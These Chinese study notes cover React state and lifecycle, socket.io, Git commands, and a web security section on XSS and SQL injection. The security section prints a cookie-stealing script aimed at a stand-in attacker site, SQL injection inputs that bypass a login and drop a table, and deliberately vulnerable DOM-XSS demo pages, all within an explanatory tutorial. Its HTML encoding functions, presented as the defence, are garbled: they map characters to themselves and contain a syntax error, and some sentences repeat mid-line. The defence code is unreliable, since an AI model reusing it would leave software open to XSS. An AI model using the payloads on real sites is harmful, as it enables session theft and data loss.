				const isHot = this.state.isHot
				//严重注意：状态必须通过setState进行更新,且更新是一种合并，不是替换。
				this.setState({isHot:!isHot})
				console.log(this.state.isHot);

				//严重注意：状态(state)不可直接更改，下面这行就是直接更改！！！
				//this.state.isHot = !isHot //这是错误的写法
			}
		}
		//2.渲染组件到页面
		ReactDOM.render(<Weather/>,document.getElementById('test'))		
	</script>
</body>
</html>
```

ES6简化版

```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>state简写方式</title>
</head>
<body>
	<!-- 准备好一个“容器” -->
	<div id="test"></div>
	<!-- 引入react核心库 -->
	<script type="text/javascript" src="../js/react.development.js"></script>
	<!-- 引入react-dom，用于支持react操作DOM -->
	<script type="text/javascript" src="../js/react-dom.development.js"></script>
	<!-- 引入babel，用于将jsx转为js -->
	<script type="text/javascript" src="../js/babel.min.js"></script>
	<script type="text/babel">
		//1.创建组件
		class Weather extends React.Component{
			//初始化状态
			state = {isHot:false,wind:'微风'}
			render(){
				const {isHot,wind} = this.state
				return <h1 onClick={this.changeWeather}>今天天气很{isHot ? '炎热' : '凉爽'}，{wind}</h1>
			}

			//自定义方法————要用赋值语句的形式+箭头函数
			changeWeather = ()=>{
				const isHot = this.state.isHot
				this.setState({isHot:!isHot})
			}
		}
		//2.渲染组件到页面
		ReactDOM.render(<Weather/>,document.getElementById('test'))	
	</script>
</body>
</html>
```



#### props

所有组件标签的属性的集合对象
给标签指定属性, 保存外部数据(可能是一个function)
在组件内部读取属性: this.props.propertyName
作用: 从目标组件外部向组件内部传递数据
对props中的属性值进行类型限制和必要性限制
	Person.propTypes = {
		name: React.PropTypes.string.isRequired,
		age: React.PropTypes.number.isRequired
	}
扩展属性: 将对象的所有属性通过props传递
    <Person {...person}/>

#### refs

	组件内包含ref属性的标签元素的集合对象
	给操作目标标签指定ref属性, 打一个标识
	在组件内部获得标签对象: this.refs.refName(只是得到了标签元素对象)
	作用: 找到组件内部的真实dom元素对象, 进而操作它

### 2.3. 组件中的事件处理

	1. 给标签添加属性: onXxx={this.eventHandler}
	2. 在组件中添加事件处理方法
	    eventHandler(event) {
	                
	    }
	3. 使自定义方法中的this为组件对象
	  	在constructor()中bind(this)
	  	使用箭头函数定义方法(ES6模块化编码时才能使用)
	4. 事件监听
		绑定事件监听
			事件名
			回调函数
		触发事件
			用户对对应的界面做对应的操作
			编码

### 2.4. 组件的组合使用

	1)拆分组件: 拆分界面,抽取组件
	2)实现静态组件: 使用组件实现静态页面效果
	3)实现动态组件
		①　动态显示初始化数据
		②　交互功能(从绑定事件监听开始)

### 2.5. 组件收集表单数据

	受控组件
	非受控组件

### 2.6. 组件的生命周期

	1. 组件的三个生命周期状态:
		Mount：插入真实 DOM
		Update：被重新渲染
		Unmount：被移出真实 DOM
	2. 生命周期流程:
		* 第一次初始化显示: ReactDOM.render(<Xxx/>, containDom)
			constructor()
			componentWillMount() : 将要插入回调
			render() : 用于插入虚拟DOM回调
			componentDidMount() : 已经插入回调
		* 每次更新state: this.setState({})
		    componentWillReceiveProps(): 接收父组件新的属性
		    componentWillUpdate() : 将要更新回调
		    render() : 更新(重新渲染)
		    componentDidUpdate() : 已经更新回调
		* 删除组件: ReactDOM.unmountComponentAtNode(div): 移除组件
			componentWillUnmount() : 组件将要被移除回调
	3. 常用的方法
		render(): 必须重写, 返回一个自定义的虚拟DOM
	  	constructor(): 初始化状态, 绑定this(可以箭头函数代替)
	  	componentDidMount() : 只执行一次, 已经在dom树中, 适合启动/设置一些监听

![组件生命周期](http://i.imgur.com/h5khD9F.png)


### 2.7. 虚拟DOM与DOM diff算法

### 1). 虚拟DOM是什么?

	一个虚拟DOM(元素)是一个一般的js对象, 准确的说是一个对象树(倒立的)
	虚拟DOM保存了真实DOM的层次关系和一些基本属性，与真实DOM一一对应
	如果只是更新虚拟DOM, 页面是不会重绘的

### 2). Virtual DOM 算法的基本步骤

	用JS对象树表示DOM树的结构；然后用这个树构建一个真正的DOM树插到文档当中
	当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异
	把差异应用到真实DOM树上，视图就更新了

### 3). 进一步理解

    Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。
    可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。

![](http://i.imgur.com/psaZdqN.png)


## 2.8. 命令式编程与声明式编程

声明式编程
	只关注做什么, 而不关注怎么做(流程),  类似于填空题
命令式编程
	要关注做什么和怎么做(流程), 类似于问答题

var arr = [1, 3, 5, 7]
// 需求: 得到一个新的数组, 数组中每个元素都比arr中对应的元素大10: [11, 13, 15, 17]
// 命令式编程
var arr2 = []
for(var i =0;i<arr.length;i++) {
	arr2.push(arr[i]+10)
}
console.log(arr2)
// 声明式编程
var arr3 = arr.map(function(item){
	return item +10
})
// 声明式编程是建立命令式编程的基础上

// 数组中常见声明式方法
	map() / forEach() / find() / findIndex()



# WebSocket

## 简介

WebSocket 是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。

WebSocket 使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在 WebSocket API 中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。

在 WebSocket API 中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。

现在，很多网站为了实现推送技术，所用的技术都是 Ajax 轮询。轮询是在特定的的时间间隔（如每1秒），由浏览器对服务器发出HTTP请求，然后由服务器返回最新的数据给客户端的浏览器。这种传统的模式带来很明显的缺点，即浏览器需要不断的向服务器发出请求，然而HTTP请求可能包含较长的头部，其中真正有效的数据可能只是很小的一部分，显然这样会浪费很多的带宽等资源。

HTML5 定义的 WebSocket 协议，能更好的节省服务器资源和带宽，并且能够更实时地进行通讯。

## 基本使用

客户端：

​		普通使用：

​		**Vue中使用：**

​		**下载插件socket.io-client:**

```
		npm install socket.io-client  //推荐3.0.3版本
```

​		**在main.js中注册**

```
		import { io } from 'socket.io-client'
		//设置io连接配置，并且连接
         	const socket = io('http://localhost:5000',
            {	
            	//禁止默认自动断开重连
              reconnection:false
            }
          );
          //把socket对象与Vue的原型绑定，这样就可以在其他组件引用了
   		Vue.prototype.$socket = socket
```

​		**在其他组件就可以使用了：**

```
		//发送事件
		  this.$socket.emit('login', this.msgRecords)
		//接收消息
		  this.$sockets.on('broadcast', (data) => {
      		console.log(data)
          })
```

**服务器端：**

​	**服务器端使用，下载socket.io这个插件（当然也有其他插件）**

```
	npm i --save socket.io@3.0.3
```

**服务器使用最基本代码：**

```
     var app = require('express')()
     var http = require('http').Server(app)
    	var io = require('socket.io')(http, {
    	//由于socket.io使用的并不是ws协议，而是经过一些处理的，所以默认不允许跨域，需要以下配置来允许跨域
       cors: {
         origin: "*",
         methods: ["GET", "POST"]
       }
     })
     io.on('connection', function (socket) {
      console.log('连接成功')
     })
     http.listen(5000, function () {
       console.log('listening on *:5000')
     })
```

**进阶功能：**

**监听连接成功：**

```
     //连接成功
     io.on('connect', function (socket) {
         console.log(‘连接成功')
       })
```

`这里的参数socket是当前连接成功的网络连接`

**发送消息：**

```
     io.on('connect', function (socket) {
     //sendevent是发送的事件，第二参数是数据，客户端对应要监听该事件才能接收该数据
         socket.emit('sendevent', '发送数据')
         console.log('成功注册了' + data)
       })
```

因为这里是使用socket.on，所以只会发送给这个刚连接成功的连接（socket是一个网络连接)

**接收消息：**

```
      socket.on('chat', function (data) {
         console.log(data)   //data就是接收的数据
         })
```

**广播信息：**

```
      // 对除当前socket连接的其他所有socket连接发消息
       function broadcastExceptSelf(socket) {
         console.log('广播')
         socket.broadcast.emit('broadcast', '广播消息')//broadcast广播事件，客户端按普通的监听该事件就行了，
       }
```

广播实际上就是每个socket都单播的实现

# Git

## 第一章：快速入门

### 什么是Git

Git是一个分布式的版本控制软件。

- 软件，类似于QQ、office、dota等安装到电脑上才能使用的工具。
- 版本控制，类似于毕业论文、写文案、视频剪辑等，需要反复修改和保留原历史数据。
- 分布式
  - 文件夹拷贝
  - 本地版本控制
  - 集中式版本控制
  - 分布式版本控制

### 为什么要做版本控制

因为在很多情况下，我们无论是写论文，写文档，写程序，写网页都几乎不可能是一次性完成的，都要进行多次修改，甚至多个版本，各种改进，试想一下你写做PPT没有ctrl+z这些撤销修改的功能会有多恶心。写文档需要office，写程序和网页也必须得有我们专属的工具啦，它的功能非常强大，而且非常有必要，可以通过几行代码就把你的代码分享出去，几行代码就把别人的代码克隆下来。

### 安装

1. 浏览器输入：https://git-scm.com/download，根据自己电脑系统下载相应的安装包，

2. 点击下载好的安装包安装这个软件

   ![在这里插入图片描述](https://img-blog.csdn.net/20181012192902122?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncXFkeQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

3. 一直点击next，直到出现install，点击install，安装完成后点击finish：

   ![在这里插入图片描述](https://img-blog.csdn.net/20181012194134259?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncXFkeQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

4. 安装好后在桌面界面点击鼠标右键，会出现如下界面

   ![在这里插入图片描述](https://img-blog.csdn.net/20181012194653451?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncXFkeQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

5. 检查git是否安装OK

   ​	![在这里插入图片描述](https://img-blog.csdn.net/20181012195409372?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h1YW5ncXFkeQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

   弹出上图所示界面就说明安装成功啦！！

### 环境配置

### 基本命令

想让git对一个目录进行版本控制需要以下步骤：

1. 进入要管理的文件夹

2. 执行初始化命令

   ```
   git init
   ```

3. 查看管理目录下的文件状态

   ```
   git status
   注：新增的文件和修改过后的文件都是红色
   ```

4. 撤销所有文件的修改

   ```
   git checkout .
   ```
   
5. 管理指定文件

   ```
   注：添加单个文件
   git add 文件名
   注：添加所有文件
   git add .
   注：把暂存区的文件退回到工作区
   git reset HEAD
   ```

6. 个人信息配置：用户名、邮箱【一次即可】

   ```
   git config --global user.eamil 'you@example.com'
   git config --global user.name 'youname'
   ```

7. 生成版本

   ```
   git commit -m '描述信息'
   ```

8. 查看版本记录

   1.git log 命令可以显示所有提交过的版本信息

   ```
   git log  //显示所有提交过的版本信息
   ```

   ![image-20210403200019275](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403200019.png)

    如果感觉太繁琐，可以加上参数  --pretty=oneline，git log --pretty=oneline只会显示版本号和提交时的备注信息

   ![image-20210403195942791](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403195943.png)

   我们还可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：

   ![image-20210403200737949](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403200738.png)

- 现在我们可以更清楚明了地看到何时工作分叉、又何时归并。

- 你也可以用 **--reverse** 参数来逆向显示所有日志。

- ![image-20210403200851501](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403200851.png)

- 如果只想查找指定用户的提交日志可以使用命令：git log --author , 例如，比方说我们要找 Git 源码中 Linus 提交的部分：

- ![image-20210403201013183](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403201013.png)

- - 如果你要指定日期，可以执行几个选项：--since 和 --before，但是你也可以用 --until 和 --after。

  - 例如，如果我要看 Git 项目中三周前且在四月十八日之后的所有提交，我可以执行这个（我还用了 --no-merges 选项以隐藏合并提交）

  - ![image-20210403201100759](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403201101.png)

2.git reflog 可以查看所有分支的所有操作记录（包括已经被删除的 commit 记录和 reset 的操作）

例如执行 git reset --hard HEAD~1，退回到上一个版本，用git log则是看不出来被删除的commitid，

用git reflog则可以看到被删除的commitid，我们就可以买后悔药，恢复到被删除的那个版本。

![image-20210403200346411](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210403200346.png)

1. 回滚至之前的版本

   1.1、回滚到上一个版本

   ```
   //回滚到上一个版本
   git reset --hard HEAD^ 
   //回滚到前三次提交以此类推，回退到n次提交之前
   git reset --hard HEAD~3
   ```

   1.2、回滚到之前的版本

   ```
   git log
   git reset --hard 版本号
   ```

2. 回滚至之后的版本

   ```
   git reflog 
   git reset --hard 版本号
   ```

**小总结：**

```
     git init
     git add
     git commit
     git log
     git reflog
     git reset -hard 版本号
```

![image-20201014165041112](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221424.png)

补充：git checkout

作用：假如你修改了代码，但是并没有git add，如果你想取消这部分修改，可以使用git checkout查看修改的文件

​		git checkout 也有切换分支的功能

![image-20201014165247276](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221428.png)

之后在git checkout -- src/App.vue     

`注意：--两边都是有一个空格的`

如果想把所有修改过的文件都还原，使用git checkout .

我们每次代码的版本都会在本地有备份，可以切换到任意的版本进行开发，当我们上传到云端时，也是会把所有版本上传的，另一台设备clone的话也会clone所有版本

## 第二章：分支开发

### 分支

分支可以给使用者提供多个环境开发，意味着尼刻意把你的工作从开发主线上分离开来，以免避免影响开发主线，最后合并就好了。

![image-20201014171605808](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221431.png)

### 命令

- 查看分支

  ```
  git branch
  ```

- 创建分支

  ```
  git branch 分支名称
  ```

- 切换分支

  ```
  git checkout 分支名称
  ```

- 分支合并（可能产生冲突）

  ```
  git merge 要合并的分支
  注意：切换分支再合并
  ```

- 删除分支

  ```
  git branch -d分支名称
  ```

大概流程：

![image-20201014175020882](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221435.png)

## 线上协作

### 案例演示

**工作环境**

![image-20201014181018451](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221438.png)



1. 首先，注册github账号，并创建远程仓库，然后再执行命令，将代码上传到github.

![image-20201014180652406](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221442.png)

```
	1、给远程仓库起别名
		git remote add origin 远程仓库地址
		git remote rm origin  删除该别名
	2、向远程推送代码
		git push -u origin 分支
```

2、初次再公司新电脑

```
	1、克隆远程仓库代码
		git clone 远程仓库地址（内部已经git remote add origin远程仓库地址）
	2、向远程推送代码
		git push -u origin 分支
```

在公司下载完代码后，继续开发

```
	1、切换到dev分支进行开发
		git checkout dev
	2、把master分支合并到dev[仅一次]
		git merge master
	3、修改代码
	4、提交代码
		git add .
		git commit -m 'xx'
		git push origin dev
```

下班后回到家继续写代码

```
	1、切换到dev分支进行开发
		git checkout dev
	2、拉代码
		git merge master
	3、继续开发
	4、提交代码
		git add .
		git commit -m 'xxx'
		git push origin dev
```

到公司继续开发

```
	1、切换到dev分支进行开发
		git checkout dev
	2、拉最新代码（不必再clone,只需要通过pull获取最新代码即可）
		git merge master
	3、继续开发
	4、提交代码
		git add .
		git commit -m 'xxxx'
		git push origin dev
```

开发完毕，上线

```
	1、将dev分支合并到master，进行上线
		git checkout master
		git merge dev
		git push origin master
	2、把dev分支也推送到远程
		git checkout dev
		git merge master
		git push origin dev
```

在公司约妹子忘记提交代码

```
	1、拉代码
		git pull origin dev
	2、继续开发
		
	3、提交代码
		git add .
		git commit -m 'xxxxx'
	注：忘记push了
```

回家继续写代码

```
	1、代码，发现在公司写的代码忘记提交了。。。
		git pull origin dev
	2、继续开发其他功能
	3、把dev分支也推送到远程
		git add .
		git commit -m 'xx'
		git push origin dev
```

到公司继续写代码

```
	1、拉代码，把晚上在家写的代码拉到本地（有合并、可能产生冲突）
		git pull origin dev
	2、如果有冲突，手动解决冲突
	3、继续开发其他功能
	4、把dev分支推送到远程
		git add .
		git commit -m 'xx'
		git push origin dev
```

其他命令

```
	git pull origin dev
	等价于
	git fetch origin dev
	git merge origin/dev
```

![image-20201014183130914](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221446.png)

记录图形展示

```
	git log --graph 
```



### rebase

rebase的作用？

# Web安全

## XSS攻击

> **XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。**XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：
> 恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。

### 反射型XSS

> 反射性XSS的原理是：反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。
>
> 反射性XSS又可以叫做非持久性XSS。为什么叫反射型XSS呢？那是因为这种攻击方式的注入代码是从目标服务器通过错误信息，搜索结果等方式反射回来的，而为什么又叫非持久性XSS呢？那是因为这种攻击方式只有一次性。

比如：攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接的时候，注入脚本被传输到目标服务器上，然后服务器将注入脚本 "反射"到受害者的浏览器上，从而浏览器就执行了该脚本。

因此反射型XSS的攻击步骤如下：

1.攻击者在url后面的参数中加入恶意攻击代码。

2.当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。

3.用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。

4.攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户
			的行为，调用目标网站接口执行攻击等操作。

常见的反射性XSS有哪些？

常见的是：**恶意链接。**

### 存储型XSS

> 存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。

比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：<script>window.open("www.gongji.com?param="+document.cookie)</script> 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。

**因此存储型XSS的攻击步骤如下：**

1. 攻击者将恶意代码提交到目标网站数据库中。
2. 用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。
3. 用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。
4.  那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该
   cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。

**如何防范？**
       1. 后端需要对提交的数据进行过滤。
              2. 前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。

### DOM-based型XSS

> 我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。

因此DOM型XSS的攻击步骤如下：

1. 攻击者构造出特殊的URL、在其中可能包含恶意代码。
2.  用户打开带有恶意代码的URL。
3.  用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。
4.  执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口
   执行攻击者一些操作。

**DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：**

1. 使用document.write直接输出数据。

2. 使用innerHTML直接输出数据。

3.  使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。
   比如如下demo:

   ```
   <script>
     document.body.innerHTML = "<a href='"+url+"'>"+url+"</a>";
   </script>
   ```

   假如对于变量url的值是：javascript:alert('dom-xss'); 类似这样的，那么就会收到xss的攻击了。因此对于DOM XSS主要是由于本地客户端获取的DOM数据在本地执行导致的。因此我们需要对HTML进行编码，对JS进行编码来防止这些问题产生。具体如何编码可以请看我下面的 XSS 如何防范那个地方即可。

   我们接下来看看demo代码吧：

   **1. 使用document.write直接输出导致浏览器解析恶意代码**
   代码如下：

   ```
   <!DOCTYPE html>
   <html>
   <head>
     <meta charset=utf-8>
     <meta name="referrer" content="never">
     <title></title>
   </head>
   <body>
     <script type="text/javascript">
       var s = location.search;            // 返回URL中的查询部分（？之后的内容）
       // 为了方便演示，我们假如url是 如下这样的
       // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
       // 然后我们的是 s 的值就为如下：
       s = "?url=javascript:alert('xsstest')";
       s = s.substring(1, s.length);       // 返回整个查询内容
       var url = "";                       // 定义变量url
       if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
         var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
         url = s.substring(pos, s.length);  // 得到地址栏里的url参数
       } else {
         url = "url参数为空";
       }
       document.write('url: <a href="' + url + '">"' + url + '"</a>'); 
     </script>
   </body>
   </html>
   ```

   页面渲染完成后，点击弹窗如下所示：

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210502112517.png" alt="img" style="zoom: 67%;" />

   **2. 使用innerHTML直接输出导致浏览器解析恶意代码**
   	代码如下：

   ```
   <!DOCTYPE html>
   <html>
   <head>
     <meta charset=utf-8>
     <meta name="referrer" content="never">
     <title></title>
   </head>
   <body>
     <script type="text/javascript">
       var s = location.search;            // 返回URL中的查询部分（？之后的内容）
       // 为了方便演示，我们假如url是 如下这样的
       // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
       // 然后我们的是 s 的值就为如下：
       s = "?url=javascript:alert('xsstest')";
       s = s.substring(1, s.length);       // 返回整个查询内容
       var url = "";                       // 定义变量url
       if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
         var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
         url = s.substring(pos, s.length);  // 得到地址栏里的url参数
       } else {
         url = "url参数为空";
       }
     </script>
     <div id='test'><a href=""></a></div>
     <script type="text/javascript">
         document.getElementById("test").innerHTML = '我的url是: <a href="' + url + '">"' + url + '"</a>';
     </script>
   </body>
   </html>
   ```

   点击一样也会弹窗窗口的。也会一样执行xss攻击的。

   **3. 使用location/location.href/location.replace/iframe.src 造成的XSS**

   如下代码：

   ```
   <!DOCTYPE html>
   <html>
   <head>
     <meta charset=utf-8>
     <meta name="referrer" content="never">
     <title></title>
   </head>
   <body>
     <script type="text/javascript">
       var s = location.search;            // 返回URL中的查询部分（？之后的内容）
       // 为了方便演示，我们假如url是 如下这样的
       // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest'); 
       // 然后我们的是 s 的值就为如下：
       s = "?url=javascript:alert('xsstest')";
       s = s.substring(1, s.length);       // 返回整个查询内容
       var url = "";                       // 定义变量url
       if (s.indexOf("url=") > -1) {       // 判断URL是否为空 
         var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符
         url = s.substring(pos, s.length);  // 得到地址栏里的url参数
       } else {
         url = "url参数为空";
       }
     </script>
     <div id='test'><a href=""></a></div>
     <script type="text/javascript">
       location.href = url;
     </script>
   </body>
   </html>
   ```

   刷新下页面，也会弹出窗口执行 xss攻击了。

## SQL注入

> ​	SQL注入是通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。

什么意思呢？我们来打个比方：我们有一个登录框，需要输入用户名和密码对吧，然后我们的密码输入 'or '123' = '123 这样的。
我们在查询用户名和密码是否正确的时候，本来执行的sql语句是：select * from user where username = '' and password = ''. 这样的sql语句，现在我们输入密码是如上这样的，然后我们会通过参数进行拼接，拼接后的sql语句就是：
**select \* from user where username = '' and password = ' ' or '123' = '123 ';** 这样的了，那么会有一个or语句，只要这两个有一个是正确的话，就条件成立，因此 123 = 123 是成立的。因此验证就会被跳过。这只是一个简单的列子，比如还有密码比如是这样的：'; drop table user;, 这样的话，那么sql命令就变成了：
**select \* from user where username = '' and password = ''; drop table user;'** , 那么这个时候我们会把user表直接删除了。

sql被攻击的原因是：sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。

**防范的方法：**

1. 我们可以使用预编译语句(PreparedStatement)，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。
2.  数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的方式。

## cookie安全策略

> 在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：
>
> **http-only:** 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.
> 		**secure-only:** 只允许https请求读取，发送请求时自动发送cookie。
> 		**host-only:** 只允许主机域名与domain设置完成一致的网站才能访问该cookie。

## X-XSS-Protection设置

目前该属性被所有的主流浏览器默认开启XSS保护。该参数是设置在响应头中目的是用来防范XSS攻击的。它有如下几种配置：
	值有如下几种：默认为1.
	0：禁用XSS保护。
	1：启用XSS保护。
	1;mode=block; 启用xss保护，并且在检查到XSS攻击是，停止渲染页面。

## XSS防御HTML编码

我们为什么要防御HTML编码呢？比如如下html代码：<div>content</div>,在div标签中存在一个输出变量content</div>,在div标签中存在一个输出变量{content}. 那么浏览器在解析的过程中，首先是html解析，当解析到div标签时，再解析 content的内容，然后会将页面显示出来。那假如该content的内容，然后会将页面显示出来。那假如该{content} 的值是 <script>alert('XSS攻击')</script> 这样的呢？因此该script脚本就会解析并且执行了，从而达到XSS的攻击目标。
因此我们需要将不可信数据放入到html标签内(比如div、span等)的时候需要进行html编码。
编码规则：将 & < > " ' / 转义为实体字符。如下基本转义代码：

```
// 使用正则表达式实现html编码
    function htmlEncodeByRegExp(str) {
      var s = '';
      if (str.length === 0) {
        return s;
      }
      return (s + str)
        .replace(/&/g, "&")
        .replace(/</g, "<")
        .replace(/>/g, ">")
        .replace(/ /g, " ")
        .replace(/\'/g, "&#39")
        .replace(/\"/g, """)
        .replace(/\//g, '&#x2F;');
    }
    // 使用正则表达式实现html解码
    function htmlDecodeByRegExp(str) {
      var s = '';
      if (str.length === 0) {
        return s;
      }
      return (s + str)
        .replace(/&/g, "&")
        .replace(/</g, "<")
        .replace(/>/g, ">")
        .replace(/ /g, " ")
        .replace(/&#39/g, "\'")
        .replace(/"/g, "\"")
        .replace(/&#x2F;/g, "\/");
    }
```

实现demo如下：

```
<!DOCTYPE html>
    <html>
    <head>
      <meta charset=utf-8>
      <meta name="referrer" content="never">
      <title></title>
    </head>
    <body>
      <script type="text/javascript">
        // 使用正则表达式实现html编码
        function htmlEncodeByRegExp(str) {
          var s = '';
          if (str.length === 0) {
            return s;
          }
          return (s + str)
            .replace(/&/g, "&")
            .replace(/</g, "<")
            .replace(/>/g, ">")
            .replace(/ /g, " ")
            .replace(/\'/g, "&#39")
            .replace(/\"/g, """)
            .replace(/\//g, '&#x2F;');
        }
        // 使用正则表达式实现html解码
        function htmlDecodeByRegExp(str) {
          var s = '';
          if (str.length === 0) {
            return s;
          }
          return (s + str)
            .replace(/&/g, "&")
            .replace(/</g, "<")
            .replace(/>/g, ">")
            .replace(/ /g, " ")
            .replace(/&#39/g, "\'")
            .replace(/"/g, "\"")
            .replace(/&#x2F;/g, "\/");
        }

        // 测试代码：
        var html = '<br>aaaaaa<p>xxxxxx</p>';
        var encodeHtml = htmlEncodeByRegExp(html);
        // 输出：使用正则表达式对html编码：<br>aaaaaa<p>xxxxxx<&#x2F;p>
        console.log("使用正则表达式对html编码：" + encodeHtml);
        var decodeHtml = htmlDecodeByRegExp(encodeHtml);

        // 输出：使用正则表达式对html解码：<br>aaaaaa<p>xxxxxx</p>
        console.log("使用正则表达式对html解码：" + decodeHtml);

      </script>
    </body>
    </html>
```

## XSS 防御HTML Attribute编码

和HTML编码一样，html中的属性也要进行编码，比如 <input name="name"/>这样的，name是input的属性，因此在html解析时，会对name属性进行编码，因为假如name"/>这样的，name是input的属性，因此在html解析时，会对name属性进行编码，因为假如{name} 的值为：" " onclick="alert('属性XSS')" " " 这样的，也就是说input变成这样的了，<input name=" " onclick="alert('属性XSS')" " "></input>，input属性name被插入onclick事件了，因此也需要针对这种常规的html属性，都需要对其进行HTML属性编码。
因此我们需要将不可信数据放入html属性时(不含src、href、style 和 事件处理函数(onclick, onmouseover等))。需要进行HTML Attribute 编码。
编码规则：除了字母、数字、字符以外，使用 &#x;16进制格式来转义ASCII值小于256所有的字符。

因此编码代码如下：

```
function encodeForHTMLAttibute(str) {
      let encoded = '';
      for(let i = 0; i < str.length; i++) {
        let ch = hex = str[i];
        if (!/[A-Za-z0-9]/.test(str[i]) && str.charCodeAt(i) < 256) {
          hex = '&#x' + ch.charCodeAt(0).toString(16) + ';';
        }
        encoded += hex;
      }
      return encoded;
   };
```

## XSS防御之javascript编码

在上面的 XSS 防御HTML Attribute编码中我们是可以防御XSS攻击，但是它只能防御的是HTML通用属性，并不是全部属性，在html中还存在很多支持协议解析的html属性，比如 onclick, onerror, href, src 等这些，类似这些属性我们是无法通过HTML编码来防范XSS攻击的。因为浏览器会先解析html编码的字符，将其转换为该属性的值，但是该属性本身支持JS代码执行，因此游览器在HTML解码后，对该属性的值进行JS解析，因此会执行响应的代码。

